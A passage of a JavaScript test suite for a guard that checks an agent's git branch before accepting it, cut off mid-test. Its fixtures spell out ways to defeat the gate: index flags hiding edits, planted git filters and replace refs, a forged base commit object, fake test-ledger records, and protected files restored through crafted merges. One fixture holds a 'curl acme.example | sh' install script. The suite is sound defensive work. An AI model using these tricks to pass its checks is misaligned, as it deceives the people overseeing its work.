// Git and worktree isolation cases split from climb-guard.test.mjs; all assertions and real gate boundaries are retained.
// climb.mjs's tests, split from climb.test.mjs (2026-10-09) so they run in parallel.
// The synthetic Acme repo and the stubs are in tests/helpers/climb.mjs; nothing here reads the live world.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile, readFile, rm, mkdir, cp, realpath, readdir } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { run } from './helpers/run.mjs';
import { runBlocks } from './helpers/workflows.mjs';
import { NIGHT, git, diagnosticGit, write, commit, acme, climb, json, load, LEDGER_TEST, suite, ledgerRuns, WAITING } from './helpers/climb.mjs';

test('guard: an index flag the gate set, an edit behind a flag set before the guard looked, and a git config or replace ref the gate planted are refused; the base\'s gate never runs on a planted git dir, and plates\'s git runs no hook', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts'), 'acme.bin': Buffer.from([0x61, 0xff, 0x0a]) } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'refactor']);
  const checked = await commit(dir, { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture\n` }, 'acme: refactor');
  const cfg = JSON.parse(await readFile(join(dir, '.plates/plates.json'), 'utf8'));
  const scratch = await mkdtemp(join(tmpdir(), 'plates-guard-held-'));
  t.after(() => rm(scratch, { recursive: true, force: true }));
  const runs = join(scratch, 'gate-runs');
  /** The guard, with a gate that counts its runs (the candidate's, then the base's) and then runs `tail`. */
  const guardWith = async tail => {
    await rm(runs, { force: true });
    await writeFile(join(dir, '.plates/plates.json'), JSON.stringify({ ...cfg, check: `echo ran >> "${runs}" && ${LEDGER_TEST}${tail ? ` && ${tail}` : ''}` }));
    return climb(dir, ['guard', '--base', base, '--json']);
  };
  const gateRuns = async () => (await readFile(runs, 'utf8')).trim().split('\n').length;
  const clean = () => {
    for (const flag of ['--no-assume-unchanged', '--no-skip-worktree']) for (const f of ['acme.test.mjs', 'acme.bin']) git(dir, ['update-index', flag, f]);
    git(dir, ['reset', '-q', '--hard', checked]);
  };

  // A hook in the git dir before the guard looked (the git dir is as it was after the gate): plates's git runs
  // it never, though the base's worktree is checked out (post-checkout) under it.
  const mark = join(scratch, 'hook-ran');
  await writeFile(join(dir, '.git/hooks/post-checkout'), `#!/bin/sh\ntouch "${mark}"\n`, { mode: 0o755 });
  const honest = await guardWith('');
  assert.equal(honest.status, 0, honest.stdout + honest.stderr);
  assert.equal(await gateRuns(), 2, 'the base\'s gate first (#82), then the candidate\'s');
  assert.equal(existsSync(mark), false, 'a hook in the git dir ran from plates\'s git (core.hooksPath)');
  await rm(join(dir, '.git/hooks/post-checkout'));

  for (const [why, tail, said] of [
    ['assume-unchanged, then an edit', 'git update-index --assume-unchanged acme.test.mjs && echo "// more" >> acme.test.mjs', /set or cleared an index flag after the guard's checks \(assume-unchanged or skip-worktree: h acme\.test\.mjs\)/],
    ['skip-worktree, then an edit', 'git update-index --skip-worktree acme.test.mjs && echo "// more" >> acme.test.mjs', /set or cleared an index flag after the guard's checks \(assume-unchanged or skip-worktree: S acme\.test\.mjs\)/],
    ['a config planted', 'git config acme.planted yes', /changed the git dir's config, hooks or attributes, or its replace refs/],
    // -f: the same command is the base's gate too (#82: it runs first), which makes the ref before the candidate's does.
    ['a replace ref planted', `git replace -f --graft ${base} ${checked}`, /changed the git dir's config, hooks or attributes, or its replace refs/],
  ]) {
    const g = await guardWith(tail);
    assert.equal(g.status, 1, `${why}: ${g.stdout}${g.stderr}`);
    assert.ok(json(g).problems.some(p => said.test(p)), `${why}: ${JSON.stringify(json(g).problems)}`);
    assert.equal(await gateRuns(), 2, `${why}: the base's gate ran first (#82), before any of the agent's code, then the candidate's`);
    if (why === 'a config planted') git(dir, ['config', '--unset', 'acme.planted']);
    if (why === 'a replace ref planted') git(dir, ['replace', '-d', base]);
    clean();
  }

  // A flag already set when the guard looked, then an edit behind it: the flags match and git status sees
  // nothing, but the files read from disk do not match.
  git(dir, ['update-index', '--assume-unchanged', 'acme.test.mjs']);
  const behind = await guardWith('echo "// more" >> acme.test.mjs');
  assert.equal(behind.status, 1, behind.stdout + behind.stderr);
  assert.ok(json(behind).problems.includes(`the gate \`echo ran >> "${runs}" && ${LEDGER_TEST} && echo "// more" >> acme.test.mjs\` changed a tracked file after the guard's checks (read from disk, though git status says nothing changed): nothing is taken`), JSON.stringify(json(behind).problems));
  assert.equal(await gateRuns(), 2, 'the base\'s gate first (#82), then the candidate\'s');
  clean();
  // Bytes, not text: a byte no encoding reads (0xff to 0xfe) is a change, behind a flag set before.
  const tend = await import(pathToFileURL(join(dir, 'scripts/plates/tend.mjs')).href);
  git(dir, ['update-index', '--skip-worktree', 'acme.bin']);
  const held = tend.treeState(dir);
  await writeFile(join(dir, 'acme.bin'), Buffer.from([0x61, 0xfe, 0x0a]));
  assert.equal(git(dir, ['status', '--porcelain', '--untracked-files=no']), '', 'git status sees no change to acme.bin');
  assert.deepEqual(tend.heldProblems(dir, held, 'the gate'), ['the gate changed a tracked file after the guard\'s checks (read from disk, though git status says nothing changed): nothing is taken']);
  clean();
});

// PR #59: the build and the project's perf check run before the gate and are the agent's code too: the guard
// holds the tree from before the first of them, not only across the gate.
test('guard: a perf check that stages a change or sets an index flag after the guard\'s checks is refused, though the gate after it passes', async t => {
  const perf = check => ({ jobs: ['perf'], perf: { command: 'node -e "console.log(1)"', better: 'higher', check } });
  const dir = await acme(t, { climb: perf('true'), config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'refactor']);
  const checked = await commit(dir, { 'acme.test.mjs': `${suite('acme adds')}// shared fixture\n` }, 'acme: refactor');
  const cfg = JSON.parse(await readFile(join(dir, '.plates/plates.json'), 'utf8'));
  const guardWith = async check => {
    await writeFile(join(dir, '.plates/plates.json'), JSON.stringify({ ...cfg, climb: perf(check) }));
    return climb(dir, ['guard', '--base', base, '--job', 'perf', '--json']);
  };
  const honest = await guardWith('true');
  assert.equal(honest.status, 0, honest.stdout + honest.stderr);
  for (const [check, said] of [
    ['echo "// sneak" >> acme.test.mjs && git add acme.test.mjs', /^the perf check `[^`]+` changed the tracked tree or the index after the guard's checks/],
    ['git update-index --skip-worktree acme.test.mjs && echo "// sneak" >> acme.test.mjs', /^the perf check `[^`]+` set or cleared an index flag after the guard's checks/],
    // #82: a filter the perf check plants is refused before the ledger's git status (which would run it) or the gate.
    ['git config filter.acme.clean "touch .filter-ran; cat" && echo "acme.test.mjs filter=acme" >> "$(git rev-parse --git-common-dir)/info/attributes" && touch acme.test.mjs', /^the perf check `[^`]+` changed the git dir's config, hooks or attributes/],
  ]) {
    const g = await guardWith(check);
    assert.equal(g.status, 1, `${check}: ${g.stdout}${g.stderr}`);
    assert.ok(json(g).problems.some(p => said.test(p)), `${check}: ${JSON.stringify(json(g).problems)}`);
    assert.equal(existsSync(join(dir, '.filter-ran')), false, `${check}: no filter it planted ran`);
    run('git', ['config', '--unset', 'filter.acme.clean'], { cwd: dir });
    await rm(join(dir, '.git/info/attributes'), { force: true });
    git(dir, ['update-index', '--no-skip-worktree', 'acme.test.mjs']);
    git(dir, ['reset', '-q', '--hard', checked]);
  }
});

// PR #59: the test ledger's reporter writes one record per suite it runs; a record more than the base's gate
// wrote is one the branch's own code wrote, and it could name tests the candidate's gate no longer runs.
test('guard: a ledger record the branch\'s own tests planted, naming a test its gate dropped, is refused by the count of records', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'lighter']);
  const planted = `import { test } from 'node:test';
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs';
test('acme adds', () => {});
const head = readFileSync(\`.git/\${readFileSync('.git/HEAD', 'utf8').trim().replace('ref: ', '')}\`, 'utf8').trim();
mkdirSync('.plates/test-runs', { recursive: true });
writeFileSync('.plates/test-runs/0000-planted.json', JSON.stringify({ date: new Date().toISOString(), commit: head, tests: ['acme adds', 'acme subtracts'].map(name => ({ file: 'acme.test.mjs', name, outcome: 'pass' })) }));
`;
  await commit(dir, { 'acme.test.mjs': planted }, 'acme: a lighter suite');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.match(json(g).problems.join('\n'), /^the gate `node --test [^`]+` left 2 test ledger records for [0-9a-f]{7} where the base [0-9a-f]{7}'s gate wrote 1: a record its own reporter did not write is in \.plates\/test-runs/);
});

// #82: a branch that changed the gate's scripts may split one test run into two, each a real record: the count is
// not held against it (every base test still has to run), and the gate line says the scripts changed.
test('guard: a branch that splits its test run in two through the gate\'s scripts passes, every base test run, the gate line saying so', async t => {
  const pkg = check => `${JSON.stringify({ name: 'acme', private: true, scripts: { check } }, null, 2)}\n`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'npm run check' }, config: { check: 'npm run check' }, files: { 'package.json': pkg(LEDGER_TEST), 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'split']);
  const half = LEDGER_TEST.replace('acme.test.mjs', 'acme-b.test.mjs');
  await commit(dir, { 'package.json': pkg(`${LEDGER_TEST} && ${half}`), 'acme.test.mjs': suite('acme adds'), 'acme-b.test.mjs': suite('acme subtracts') }, 'acme: two smaller runs');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, 'the split moves "acme subtracts" to another file: dropped from acme.test.mjs, as the ledger keys tests by file');
  // The same two files run as two invocations of the base's own tests, keyed alike: passes.
  git(dir, ['checkout', '-q', '-f', '-B', 'split2', base]);
  await commit(dir, { 'package.json': pkg(`${LEDGER_TEST.replace('acme.test.mjs', 'acme.test.mjs --test-name-pattern=adds')} && ${LEDGER_TEST.replace('acme.test.mjs', 'acme.test.mjs --test-name-pattern=subtracts')}`) }, 'acme: two smaller runs');
  const two = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(two.status, 0, two.stdout + two.stderr);
  assert.match(json(two).line, /the branch changed the gate's scripts/);
});

// PR #59: the sandbox walks each commit as well as the whole: a file changed in one commit and changed back
// in a later one is not in base..head, yet the branch's history carries it into main on any merge but a squash.
test('sandbox: an off-limits file, evidence or a runtime pin changed in one commit and changed back in a later one is refused; a runtime pin is an install file; plates\'s git reads no replace ref', async t => {
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', 'docs/evidence/2026-10-01-acme.md': '# Acme ordered\n' } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const sandbox = (head = 'HEAD') => climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
  for (const file of ['.github/workflows/acme.yml', 'scripts/plates/climb.mjs', '.plates/plates.json', 'docs/evidence/2026-10-01-acme.md', 'docs/evidence/2026-10-09-acme.md', '.nvmrc', 'web/.node-version', '.tool-versions', 'package-lock.json']) {
    git(dir, ['checkout', '-q', '-f', '-B', 'walk', base]);
    const was = await readFile(join(dir, file), 'utf8').catch(() => null);
    const sneak = await commit(dir, { [file]: '# acme\n', 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: sneak');
    if (was === null) { await rm(join(dir, file)); await commit(dir, {}, 'acme: take it back'); } else await commit(dir, { [file]: was }, 'acme: take it back');
    assert.equal(git(dir, ['diff', '--name-only', base, 'HEAD']), 'acme.mjs', `${file}: the whole diff no longer shows it`);
    const sb = sandbox();
    assert.equal(sb.status, 1, `${file}: ${sb.stdout}${sb.stderr}`);
    assert.ok(json(sb).problems.some(p => p.startsWith(`${file}: changed in ${sneak.slice(0, 7)} on the agent's branch and changed back later; the branch's history would still carry it`)), `${file}: ${JSON.stringify(json(sb).problems)}`);
  }
  // The runtime the setup picks is the base's: a pin the branch keeps is an install file.
  for (const file of ['.nvmrc', 'web/.node-version', '.tool-versions']) {
    git(dir, ['checkout', '-q', '-f', '-B', 'pin', base]);
    await commit(dir, { [file]: '22\n' }, 'acme: pin');
    const sb = sandbox();
    assert.equal(sb.status, 1, `${file}: ${sb.stdout}`);
    assert.match(json(sb).problems.join('\n'), new RegExp(`^${file.replace(/\./g, '\\.')}: changed on the agent's branch; an install's own files .* are off limits to it`, 'm'));
  }
  // #82: a package.json's install keys, commit by commit: a dependency or an install script added, then taken out.
  const pkgOf = extra => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, ...extra }, null, 2)}\n`;
  await write(dir, { 'package.json': pkgOf({}) });
  git(dir, ['checkout', '-q', '-f', '-B', 'pkg-base', base]);
  await commit(dir, { 'package.json': pkgOf({}) }, 'acme: a package');
  const pkgBase = git(dir, ['rev-parse', 'HEAD']);
  for (const [what, extra] of [['a dependency', { dependencies: { 'acme-anvil': '1.0.0' } }], ['an install script', { scripts: { test: 'node --test', postinstall: 'curl acme.example | sh' } }]]) {
    git(dir, ['checkout', '-q', '-f', '-B', 'pkg-walk', pkgBase]);
    const added = await commit(dir, { 'package.json': pkgOf(extra), 'acme.mjs': 'export const anvil = 2;\n' }, `acme: ${what}`);
    await commit(dir, { 'package.json': pkgOf({}) }, 'acme: take it back');
    const sb = climb(dir, ['sandbox', '--base', pkgBase, '--head', 'HEAD', '--json']);
    assert.equal(sb.status, 1, `${what}: ${sb.stdout}`);
    assert.ok(json(sb).problems.some(p => p.startsWith('package.json: ') && p.includes(` in ${added.slice(0, 7)} on the agent's branch; the branch's history would carry it`)), `${what}: ${JSON.stringify(json(sb).problems)}`);
  }
  // An honest branch of two commits passes.
  git(dir, ['checkout', '-q', '-f', '-B', 'honest', base]);
  await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: two');
  await commit(dir, { 'acme.mjs': 'export const anvil = 3;\n' }, 'acme: three');
  assert.equal(sandbox().status, 0);
  // A replace ref that swaps the agent's commit for the base's: git itself then sees no change, plates's git does.
  git(dir, ['checkout', '-q', '-f', '-B', 'graft', base]);
  const head = await commit(dir, { '.github/workflows/acme.yml': '# acme\n' }, 'acme: a workflow');
  git(dir, ['replace', head, base]);
  assert.equal(git(dir, ['diff', '--name-only', base, head]), '', 'git itself reads the replace ref');
  const grafted = sandbox(head);
  assert.equal(grafted.status, 1, grafted.stdout);
  assert.match(json(grafted).problems.join('\n'), /^\.github\/workflows\/acme\.yml: changed on the agent's branch/m);
  git(dir, ['replace', '-d', head]);
});

// #82: in a linked worktree the git dir is .git/worktrees/<name>; its config, hooks and attributes live in the
// common one. The guard fingerprints both, so a filter the gate names there is refused before plates's git reads it.
test('guard in a linked worktree: a config the gate writes to the common git dir (a clean filter) is refused', async t => {
  const dir = await acme(t);
  const wt = join(dir, '..', `${dir.split('/').pop()}-linked`);
  git(dir, ['worktree', 'add', '-q', '--detach', wt]);
  t.after(() => rm(wt, { recursive: true, force: true }));
  const tend = await import(pathToFileURL(join(dir, 'scripts/plates/tend.mjs')).href);
  const held = tend.treeState(wt);
  assert.equal(held.gitDirs.length, 2, 'the worktree\'s git dir and the common one');
  assert.deepEqual(tend.heldProblems(wt, held, 'the gate'), [], 'nothing moved yet');
  git(wt, ['config', 'filter.acme.clean', 'cat']);
  assert.match(tend.heldProblems(wt, held, 'the gate').join('\n'), /^the gate changed the git dir's config, hooks or attributes, or its replace refs/);
});

// #82: a test run twice in one gate, passing then failing behind `|| true`, is a failure: every record is read
// before a test's runs are merged into one.
test('guard: a test that passes in one run of the gate and fails in another, behind || true, is refused', async t => {
  const pkg = check => `${JSON.stringify({ name: 'acme', private: true, scripts: { check } }, null, 2)}\n`;
  const flaky = `import { test } from 'node:test';\nimport { existsSync, writeFileSync } from 'node:fs';\ntest('acme adds', () => { if (existsSync('.ran-once')) throw new Error('second run fails'); writeFileSync('.ran-once', ''); });\n`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'npm run check' }, config: { check: 'npm run check' }, files: { 'package.json': pkg(`rm -f .ran-once && ${LEDGER_TEST}`), 'acme.test.mjs': suite('acme adds') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'twice']);
  await commit(dir, { 'package.json': pkg(`rm -f .ran-once && ${LEDGER_TEST} && (${LEDGER_TEST} || true)`), 'acme.test.mjs': flaky, '.gitignore': '.ran-once\n' }, 'acme: run it twice');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.match(json(g).problems.join('\n'), /^failed: acme\.test\.mjs "acme adds" failed on [0-9a-f]{7}, though the gate `npm run check` exited 0$/m);
});

// #82: the checkout's .git pointed at another git dir (same HEAD and index, other config) is refused before plates's
// next git reads it.
test('guard in a linked worktree: a .git pointer moved to another git dir is refused', async t => {
  const dir = await acme(t);
  const wt = join(dir, '..', `${dir.split('/').pop()}-moved`);
  git(dir, ['worktree', 'add', '-q', '--detach', wt]);
  t.after(() => rm(wt, { recursive: true, force: true }));
  const tend = await import(pathToFileURL(join(dir, 'scripts/plates/tend.mjs')).href);
  const held = tend.treeState(wt);
  const other = join(dir, '..', `${dir.split('/').pop()}-othergit`);
  t.after(() => rm(other, { recursive: true, force: true }));
  await cp(held.gitDir, other, { recursive: true });
  await writeFile(join(wt, '.git'), `gitdir: ${other}\n`);
  assert.match(tend.heldProblems(wt, held, 'the gate').join('\n'), /^the gate changed where the checkout's git dir is/);
});

// #82: the candidate's own code can overwrite the base commit's loose object with its own commit's content (git
// reads a loose object without checking it hashes to its name). The base's gate runs first, before any of the
// agent's code, so the base it measures is the real base, and the dropped test is seen.
test('guard: a candidate whose test rewrites the base commit\'s object to look like itself is still compared with the real base', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'forge']);
  const forger = `import { test } from 'node:test';
import { readFileSync, writeFileSync, rmSync } from 'node:fs';
import { inflateSync, deflateSync } from 'node:zlib';
test('acme adds', () => {});
const loose = s => \`.git/objects/\${s.slice(0, 2)}/\${s.slice(2)}\`;
const head = readFileSync(\`.git/\${readFileSync('.git/HEAD', 'utf8').trim().replace('ref: ', '')}\`, 'utf8').trim();
const commit = inflateSync(readFileSync(loose(head)));
const parent = /\\nparent ([0-9a-f]{40})/.exec(commit.toString('latin1'))[1];
rmSync(loose(parent), { force: true });
writeFileSync(loose(parent), deflateSync(commit));
`;
  await commit(dir, { 'acme.test.mjs': forger }, 'acme: a lighter suite');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.deepEqual(json(g).missing, [{ file: 'acme.test.mjs', name: 'acme subtracts', how: 'dropped' }]);
});

// #83: a merge answers only for what it introduced. A branch that merges a default branch which changed a workflow
// (a release, say) is not refused for the workflow; one whose merge itself brings an off-limits change is.
test('sandbox: a merge of a default branch that changed a workflow passes; a merge that itself changes one is refused', async t => {
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n' } });
  const start = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'agent']);
  await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: the agent\'s change');
  git(dir, ['checkout', '-q', 'main']);
  const main = await commit(dir, { '.github/workflows/acme.yml': 'name: acme\n' }, 'acme: a release changes a workflow');
  git(dir, ['checkout', '-q', 'agent']);
  git(dir, ['merge', '-q', '--no-edit', main]);
  const sb = climb(dir, ['sandbox', '--base', main, '--head', 'HEAD', '--json']);
  assert.equal(sb.status, 0, sb.stdout + sb.stderr);
  // The merge itself changing the workflow (an evil merge): refused.
  git(dir, ['reset', '-q', '--hard', 'HEAD^']);
  git(dir, ['merge', '-q', '--no-commit', main]);
  await write(dir, { '.github/workflows/acme.yml': 'name: acme, by the agent\n' });
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '--no-edit']);
  const evil = climb(dir, ['sandbox', '--base', main, '--head', 'HEAD', '--json']);
  assert.equal(evil.status, 1, evil.stdout);
  assert.match(json(evil).problems.join('\n'), /^\.github\/workflows\/acme\.yml: changed on the agent's branch/m);
  assert.ok(start);
});

// #85: two merges can take an older version of a protected file from one parent and put the base's back from
// another; neither shows in a combined diff. A merge is judged against the trusted base instead.
test('sandbox: two merges that restore an older workflow and then the base\'s are refused; a merge bringing the base\'s dependencies beside the agent\'s script change passes', async t => {
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', '.github/workflows/acme.yml': 'name: acme v1\n' } });
  const start = git(dir, ['rev-parse', 'HEAD']);
  const base = await commit(dir, { '.github/workflows/acme.yml': 'name: acme v2\n' }, 'acme: a release updates the workflow');
  git(dir, ['checkout', '-q', '-b', 'agent']);
  const x = await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: the agent\'s change');
  // M1: X's tree with the older workflow, parents X and the older start; M2: X's tree, parents M1 and the base.
  await write(dir, { '.github/workflows/acme.yml': 'name: acme v1\n' });
  git(dir, ['add', '-A']);
  const older = git(dir, ['write-tree']);
  git(dir, ['reset', '-q', '--hard', x]);
  const m1 = git(dir, ['commit-tree', older, '-p', x, '-p', start, '-m', 'acme: merge the older start']);
  const m2 = git(dir, ['commit-tree', `${x}^{tree}`, '-p', m1, '-p', base, '-m', 'acme: merge the base']);
  assert.equal(git(dir, ['diff', '--name-only', base, m2]), 'acme.mjs', 'the whole diff shows only the agent\'s change');
  assert.equal(git(dir, ['diff-tree', '--cc', '--name-only', '-r', '--no-commit-id', m1]), '', 'the combined diff shows nothing for M1');
  const sb = climb(dir, ['sandbox', '--base', base, '--head', m2, '--json']);
  assert.equal(sb.status, 1, sb.stdout);
  assert.match(json(sb).problems.join('\n'), new RegExp(`^\\.github/workflows/acme\\.yml: the merge ${m1.slice(0, 7)} on the agent's branch leaves it unlike its first parent and unlike any default-branch commit it brought in`, 'm'));

  // The default branch updated a dependency; the agent's branch changed a test script; the merge brings both.
  const pkg = (deps, test) => `${JSON.stringify({ name: 'acme', private: true, scripts: { test }, dependencies: deps }, null, 2)}\n`;
  git(dir, ['checkout', '-q', '-f', 'main']);
  const s0 = await commit(dir, { 'package.json': pkg({ 'acme-anvil': '1.0.0' }, 'node --test') }, 'acme: a package');
  const b1 = await commit(dir, { 'package.json': pkg({ 'acme-anvil': '1.1.0' }, 'node --test') }, 'acme: a dependency update');
  git(dir, ['checkout', '-q', '-b', 'agent-pkg', s0]);
  await commit(dir, { 'package.json': pkg({ 'acme-anvil': '1.0.0' }, 'node --test --test-concurrency=4') }, 'acme: a faster test script');
  git(dir, ['merge', '-q', '--no-commit', b1], { allowFail: true });
  await write(dir, { 'package.json': pkg({ 'acme-anvil': '1.1.0' }, 'node --test --test-concurrency=4') });
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'acme: merge the dependency update']);
  const merged = climb(dir, ['sandbox', '--base', b1, '--head', 'HEAD', '--json']);
  assert.equal(merged.status, 0, merged.stdout + merged.stderr);
});

// #85: a branch that merged the default branch twice, a workflow and a dependency changed each time, took exactly
// the default branch's each time: it passes, though the first merge's versions are older than the base's.
test('sandbox: two honest merges of the default branch, each bringing a newer workflow and dependency, pass', async t => {
  const pkg = v => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, dependencies: { 'acme-anvil': v } }, null, 2)}\n`;
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', '.github/workflows/acme.yml': 'name: acme v1\n', 'package.json': pkg('1.0.0') } });
  const start = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'agent']);
  await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: the agent\'s change');
  git(dir, ['checkout', '-q', 'main']);
  const b1 = await commit(dir, { '.github/workflows/acme.yml': 'name: acme v2\n', 'package.json': pkg('1.1.0') }, 'acme: release 1');
  git(dir, ['checkout', '-q', 'agent']);
  git(dir, ['merge', '-q', '--no-edit', b1]);
  git(dir, ['checkout', '-q', 'main']);
  const b2 = await commit(dir, { '.github/workflows/acme.yml': 'name: acme v3\n', 'package.json': pkg('1.2.0') }, 'acme: release 2');
  git(dir, ['checkout', '-q', 'agent']);
  git(dir, ['merge', '-q', '--no-edit', b2]);
  const sb = climb(dir, ['sandbox', '--base', b2, '--head', 'HEAD', '--json']);
  assert.equal(sb.status, 0, sb.stdout + sb.stderr);
  assert.ok(start);
});

// #85: a merge of two of the agent's own branches whose package.json change is only a test script passes, as a
// commit's would; one that changes a dependency is refused.
test('sandbox: a merge of the agent\'s own branches changing only a test script passes; one adding a dependency is refused', async t => {
  const pkg = (test, deps = {}) => `${JSON.stringify({ name: 'acme', private: true, scripts: { test }, dependencies: deps }, null, 2)}\n`;
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', 'package.json': pkg('node --test') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const mergeOf = async (side, change) => {
    git(dir, ['checkout', '-q', '-f', '-B', 'agent', base]);
    await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: one side');
    git(dir, ['checkout', '-q', '-B', side, base]);
    await commit(dir, { 'acme-b.mjs': 'export const b = 1;\n' }, 'acme: the other side');
    git(dir, ['checkout', '-q', 'agent']);
    git(dir, ['merge', '-q', '--no-commit', side]);
    await write(dir, { 'package.json': change });
    git(dir, ['add', '-A']);
    git(dir, ['commit', '-q', '--no-edit']);
    return climb(dir, ['sandbox', '--base', base, '--head', 'HEAD', '--json']);
  };
  const scripts = await mergeOf('side-a', pkg('node --test --test-concurrency=4'));
  assert.equal(scripts.status, 0, scripts.stdout + scripts.stderr);
  const deps = await mergeOf('side-b', pkg('node --test', { 'acme-anvil': '1.0.0' }));
  assert.equal(deps.status, 1, deps.stdout);
  assert.match(json(deps).problems.join('\n'), /^package\.json: /m);
});

// #85: a merge's protected file is compared by its blob, not by text decoded from it. M1 merges the default
// branch's B1 but alters a binary lockfile byte (0xff to 0xfe: both decode to the replacement character); M2
// merges B2 and takes the lockfile back as the default branch has it. Only the blob tells M1's lockfile apart.
test('sandbox: a merge that alters a binary lockfile byte is refused, though the next merge restores it; a merge taking the default branch\'s deletion of a package.json passes', async t => {
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', 'web/package.json': `${JSON.stringify({ name: 'web', private: true }, null, 2)}\n` } });
  await writeFile(join(dir, 'bun.lockb'), Buffer.from([0x62, 0xff, 0x0a]));
  git(dir, ['add', '-A']); git(dir, ['commit', '-q', '-m', 'acme: a binary lockfile']);
  const start = git(dir, ['rev-parse', 'HEAD']);
  const b1 = await commit(dir, { 'acme-one.mjs': 'export const one = 1;\n' }, 'acme: release 1');
  const b2 = await commit(dir, { 'acme-two.mjs': 'export const two = 2;\n' }, 'acme: release 2');
  git(dir, ['checkout', '-q', '-b', 'agent', start]);
  const x = await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: the agent\'s change');
  git(dir, ['merge', '-q', '--no-commit', b1]);
  await writeFile(join(dir, 'bun.lockb'), Buffer.from([0x62, 0xfe, 0x0a]));
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '--no-edit']);
  const m1 = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['merge', '-q', '--no-commit', b2], { allowFail: true });
  await writeFile(join(dir, 'bun.lockb'), Buffer.from([0x62, 0xff, 0x0a]));
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '--no-edit']);
  assert.equal(git(dir, ['diff', '--name-only', b2, 'HEAD']), 'acme.mjs', 'the whole diff shows only the agent\'s change');
  const sb = climb(dir, ['sandbox', '--base', b2, '--head', 'HEAD', '--json']);
  assert.equal(sb.status, 1, sb.stdout);
  assert.match(json(sb).problems.join('\n'), new RegExp(`^bun\\.lockb: the merge ${m1.slice(0, 7)} on the agent's branch leaves it unlike its first parent and unlike any default-branch commit it brought in`, 'm'));
  // The honest merge of a default branch that deleted a workspace's package.json: as it is there, so it passes.
  git(dir, ['checkout', '-q', 'main']);
  await rm(join(dir, 'web/package.json'));
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'acme: drop the web workspace']);
  const b3 = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-B', 'agent2', x]);
  git(dir, ['merge', '-q', '--no-edit', b3]);
  const honest = climb(dir, ['sandbox', '--base', b3, '--head', 'HEAD', '--json']);
  assert.equal(honest.status, 0, honest.stdout + honest.stderr);
});

// #90: the base's gate runs before the candidate's, so a shared symlinked node_modules would let a base test write
// node_modules/base-cache (or mutate an installed file in place) and make a broken candidate pass, or dereference a
// workspace symlink in node_modules to the candidate's checkout instead of the base's.
test('#90: guard isolates node_modules in worktrees so base-gate writes cannot pass a broken candidate', async t => {
  const depFiles = {
    'node_modules/acme-dep/package.json': '{"name":"acme-dep","type":"module","exports":"./index.js"}\n',
    'node_modules/acme-dep/index.js': "export const dep = 'acme';\nexport const token = { id: 'acme' };\n",
    'node_modules/acme-dep/cache.txt': 'clean\n',
  };
  const baseSuite = `import { test } from 'node:test';
import assert from 'node:assert/strict';
